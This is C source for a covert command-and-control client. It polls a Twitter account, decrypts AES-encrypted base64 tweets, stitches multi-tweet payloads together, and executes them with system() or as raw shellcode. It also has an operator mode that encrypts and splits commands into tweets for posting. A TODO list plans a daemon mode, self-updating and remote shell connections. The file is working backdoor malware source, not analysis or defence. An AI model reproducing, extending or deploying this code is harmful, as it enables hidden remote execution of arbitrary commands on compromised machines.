/**
 * https://dev.twitter.com/rest/reference/get/statuses/user_timeline
 * http://pixelrobotics.com/2013/01/consuming-the-twitter-public-stream-with-libcurl/
 * https://curl.haxx.se/libcurl/c/getinmemory.html
 * http://stackoverflow.com/questions/21023605/initialize-array-of-strings
 *
 * Intersting examples:
 * ./get -e "echo 'hello worldddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd'"
 *
 * Compile with: make
 *
 * "Base64 encodes each set of three bytes into four bytes. In
 * addition the output is padded to always be a multiple of four.
 *
 * AES-256 is a block cipher and as such pads plaintext to block size
 *
 * @DONE:
 * (/) Pull latest tweets from a twitter feed
 * (/) Hit Twitter API
 * (/) Store CURL results in memory
 * (/) Use environment variables for credentials
 * (/) Copy tweets into an array in memory
 * (/) Save Base64 encoded bodies only into memory
 * (/) Base64 decode * tweet
 * (/) Encode/Decode tweet... Choose cipher AES-256
 * (/) Divide commands longer than 140 chars over multiple tweets
 * (/) Re-assemble commands longer than 140 chars from multiple tweets
 * (/) Execute reassembled command using system
 * (/) Setup test account to try with
 *
 * @TODO:
 * (*) Auto tweet to account divided messages
 * (*) Additional prefix pivot for system commands vs shellcode
 * (*) Add code path to ast as function pointer and execute
 * (*) Schedule on a cadence
 * (*) Run as a daemon
 * (*) Update binary
 * (*) Initiate shell connection to IP
 * (*) Devise way to spin off connections to each client
 * (*) Keep state of last action performed
 * (*) Replace libcurl with pure socket IO
 * (*) Statically link liboauth
 * (*) Replace liboauth with * pure c?
 * (*) Replace openssl with a one time pade and hand rolled base64?
 **/

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <oauth.h>
#include <curl/curl.h>
#include <math.h>
#include "base64encode.h"
#include "base64decode.h"
#include "aesencrypt.h"
#include "aesdecrypt.h"
#include "umamicrypt.h"

#define TWEET_COUNT 11
#define TWEET_LENGTH 141
#define MAX_TWEET_LENGTH 80
#define DATAFILE "tweetdata.json"
#define CMDPREFIX "CC|"
#define SHELLPREFIX "SC|"

struct MemoryStruct {
    char *memory;
    size_t size;
} chunk;

typedef enum { LIVE_MODE, OFFLINE_MODE, ACQUIRE_MODE } AppMode_t;

char **TWEETS;

void InitializeTweets(void)
{
    // allocate space for 10 pointers to tweets(strings)
    TWEETS = (char**)malloc(TWEET_COUNT*sizeof(char*));
    int i = 0;
    //allocate space for each tweet(string)
    // here allocate TWEET_LENGTH bytes
    for(i = 0; i < TWEET_COUNT; i++){
        printf("Initializing %d bytes for tweet: %d\n", TWEET_LENGTH,i);
        TWEETS[i] = (char*)malloc(TWEET_LENGTH*sizeof(char));
        memset(TWEETS[i], 0, sizeof(TWEETS[i]));
    }
}

static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    mem->memory = realloc(mem->memory, mem->size + realsize + 1);
    if(mem->memory == NULL) {
        /* out of memory! */
        printf("not enough memory (realloc returned NULL)\n");
        return 0;
    }

    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

void TwitterConnect(AppMode_t m)
{
    FILE *out;
    const char *ckey = getenv("CKEY");
    const char *csecret = getenv("CSECRET");
    const char *atok = getenv("ATOK");
    const char *atoksecret = getenv("ATOKSECRET");
    const char *url = getenv("TAPIURL");

    curl_global_init(CURL_GLOBAL_ALL);
    CURL *curl = curl_easy_init();

    // URL, POST parameters (not used in this example), OAuth signing method, HTTP method, keys
    char *signedurl = oauth_sign_url2(url, NULL, OA_HMAC, "GET", ckey, csecret, atok, atoksecret);

    // URL we're connecting to
    curl_easy_setopt(curl, CURLOPT_URL, signedurl);

    // User agent we're going to use, fill this in appropriately
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "appname/0.1");

    // libcurl will now fail on an HTTP error (>=400)
    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1);


    if (m == ACQUIRE_MODE) {
        out = fopen(DATAFILE, "w");
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)out);
    } else {
        chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
        chunk.size = 0;    /* no data at this point */
        /* send all data to this function  */
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    }

    /* get it! */
    int res = curl_easy_perform(curl);

    /* check for errors */
    if(res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
    }


    if (m == ACQUIRE_MODE)
        fclose(out);

    curl_easy_cleanup(curl);
    curl_global_cleanup();
}

/**
 * Populates either a file or memory from
 * Twitter API
 **/

void PopulateTweets(char *tweet_data, int tweets_index)
{
    // Look for a tweet body
    // this is fragile and we are lucky that the body of a tweet
    // happens to follow this pattern uniquely
    char *tweet_pt = strstr(tweet_data, ",\"text\":");

    // If a tweet body found
    if (tweet_pt != NULL)
    {
        // Move pointer forward to beginning of tweet body text
        tweet_pt = tweet_pt+9;

        // Locate the end of the tweet body
        char *tweet_end = strstr(tweet_pt, "\"");

        int char_index = 0;

        // Copy each character of the tweet into
        // Tweets
        //printf("Tweets index: %d\n", tweets_index);
        while(tweet_pt != tweet_end)
        {
            //printf("%c", *tweet_pt);
            TWEETS[tweets_index][char_index] = *tweet_pt;
            tweet_pt = tweet_pt+1;
            char_index++;
        }
        //printf("\n");
        PopulateTweets(tweet_end, (tweets_index+1));
    }
}

/**
 * Base64 decode and AES-256 decrypt a tweet
 */
int DecryptTweet(unsigned char decryptedresult[], char * tweet)
{
    int counter;
    char* base64DecodeOutput;

    Base64Decode(&base64DecodeOutput, tweet);
    strlen((const char *)base64DecodeOutput);

    int decryptedtext_len, ciphertext_len;
    unsigned char decryptedtext[10000];

    ///* A 256 bit key */
    unsigned char *key = (unsigned char *)getenv("ENCKEY");

    ///* A 128 bit IV */
    unsigned char *iv = (unsigned char *)getenv("ENCIV");

    ///* Initialise the library */
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    ciphertext_len = strlen(base64DecodeOutput);

    ///* Decrypt the ciphertext */
    decryptedtext_len = decrypt(base64DecodeOutput, ciphertext_len, key, iv,
                                decryptedtext);

    decryptedtext[decryptedtext_len] = '\0';

    strcpy(decryptedresult, decryptedtext);

    /* Clean up */
    EVP_cleanup();
    ERR_free_strings();
    return decryptedtext_len;
}

char * LookupCodePrefix(char * suppliedSwitch)
{
    printf("prefix is: %s\n", suppliedSwitch);
    if(strcmp("cmd",suppliedSwitch) == 0)
    {
        printf("Command!\n");
        return CMDPREFIX;
    }
    else if (strcmp("shell",suppliedSwitch) == 0)
    {
        printf("Shellcode!\n");
        return SHELLPREFIX;
    }
    else
    {
        printf("Unsupported payload type!\n");
        exit(1);
    }
}

char * LookupPrefix(char * decrypted)
{
    char * found_prefix;
    if ( found_prefix = strstr(decrypted, CMDPREFIX) )
    {
        return CMDPREFIX;
    }
    else if ( found_prefix = strstr(decrypted, SHELLPREFIX) )
    {
        return SHELLPREFIX;
    }
    else
    {
        return NULL;
    }
}


/**
 * Recursively prepends tweets together from
 * data source until prefix identifier is encountered.
 * Once identifier is found the payload is executed.
 **/
void ExecuteTweet(int tweet_index, char * cmd)
{
    // Decrypt here
    int decrypted_length;
    int counter;
    char * found_prefix;
    char * payload;
    char decrypted[10000];

    decrypted_length = DecryptTweet(decrypted, TWEETS[tweet_index]);

    found_prefix = LookupPrefix(decrypted);
    payload = strcat(decrypted, cmd);

    if (found_prefix != NULL)
    {
        printf("Found prefix! %s\n", found_prefix);
        payload = payload+3; // Move past the prefix
        if (strcmp(found_prefix,CMDPREFIX) == 0)
        {
            printf("Executing system command: %s\n\n", payload);
            system(payload);
        }
        else if (strcmp(found_prefix, SHELLPREFIX) == 0)
        {
            printf("Executing shellcode: %s\n\n", payload);
            int (*ret)() = (int(*)())payload;
            ret();

        }
        else
        {
            exit(1);
        }
    } else {
        printf("Prefix not found... Recurring\n");
        printf("Command so far is %s\n", payload);
        ExecuteTweet(tweet_index+1, payload);
    }
}

/**
 * Reads cached tweet data from a .json file
 **/
char * ReadTweetsFromFile()
{
    char *file_contents;
    long input_file_size;
    FILE *input_file = fopen(DATAFILE, "rb");
    fseek(input_file, 0, SEEK_END);
    input_file_size = ftell(input_file);
    rewind(input_file);
    file_contents = malloc(input_file_size * (sizeof(char)));
    fread(file_contents, sizeof(char), input_file_size, input_file);
    fclose(input_file);
    return file_contents;
}

void Acquire()
{
    TwitterConnect(ACQUIRE_MODE);
}

/**
 * Pull tweets live from a twitter account
 **/
void Live()
{
    char cmd[10000] = { 0 };
    InitializeTweets();
    TwitterConnect(LIVE_MODE);
    PopulateTweets(chunk.memory,0);
    ExecuteTweet(0, cmd);
}

/**
 * Read tweets from a cached file to work without
 * an internet connection
 **/
void Offline()
{
    char cmd[10000] = { 0 };
    InitializeTweets();
    PopulateTweets(ReadTweetsFromFile(),0);
    ExecuteTweet(0, cmd);
}

/**
 * Divides a payload into n parts determined by the
 * maximum tweet length allowed to account for base64 expansion
 * and aes-256 block size padding
 **/
int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
{

    int divisions;
    int i;
    int bytesLeft = length;
    int chunkSize = length;
    divisions = (int) ceil((double)length / MAX_TWEET_LENGTH);
    for(i=0; i<divisions;i++)
    {
        if (bytesLeft > MAX_TWEET_LENGTH)
        {
            chunkSize = MAX_TWEET_LENGTH;
        }
        else
        {
            chunkSize = bytesLeft;

        }

        memset(dest[i], 0, TWEET_LENGTH);
        strncpy(dest[i], payload, chunkSize);
        bytesLeft = bytesLeft - chunkSize;
        payload = payload + chunkSize;
    }

    return divisions;
}

/**
 * Prepends a payload with an identifier for decoding
 */
int AddPrefix(char * dest, char * payload, char * prefix)
{
    strcat(dest, prefix);
    strcat(dest, payload);
    return strlen(dest);
}

/**
 * Iterates through n tweets encrypting, encoding, and copying
 * each from source to destination
 */
void EncodeTweets(char dest[][TWEET_LENGTH], char src[][TWEET_LENGTH], int tweetCount)
{
    int i;
    int length;
    char * encryptEncode;
    for(i=0; i<tweetCount; i++)
    {
        length = Encode(&encryptEncode, src[i], (unsigned char *)getenv("ENCKEY"), (unsigned char *)getenv("ENCIV"));
        strncpy(dest[i], encryptEncode, length);
    }
}

void PrintTweets(char encoded[][TWEET_LENGTH], int tweetCount)
{
    int i;
    printf("|------ Your Tweets Are ------|\n");
    for(i=0;i<tweetCount;i++)
        printf("%s\n\n",encoded[i]);

    printf("|------ Remember to post them in reverse order! ------|\n");
}

int main(int argc, char *argv[])
{
    int opt,tweetCount;
    char prefixed[1024] = { 0 };
    char divided[TWEET_COUNT][TWEET_LENGTH];
    char encoded[TWEET_COUNT][TWEET_LENGTH];
    char *codeprefix = NULL;

    while ((opt = getopt(argc, argv, "loaep")) != -1) {
        switch (opt) {
        case 'a':
            Acquire();
            break;
        case 'l':
            Live();
            break;
        case 'o':
            Offline();
            break;
        case 'p':
            codeprefix = LookupCodePrefix(argv[2]);
            break;
        case 'e':
            if (codeprefix == NULL)
            {
                printf("Must specify prefix with -p\n");
                exit(1);
            } else
            {
                printf("%s\n", codeprefix);
                AddPrefix(prefixed, argv[4], codeprefix);
                tweetCount = DivideIntoTweets(divided, prefixed, strlen(prefixed));
                EncodeTweets(encoded, divided, tweetCount);
                PrintTweets(encoded, tweetCount);
            }
            break;
        default:
            fprintf(stderr, "Usage: %s [-loae] \n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    // Cleanup struct that was allocated
    free(chunk.memory);
    return 0;
}
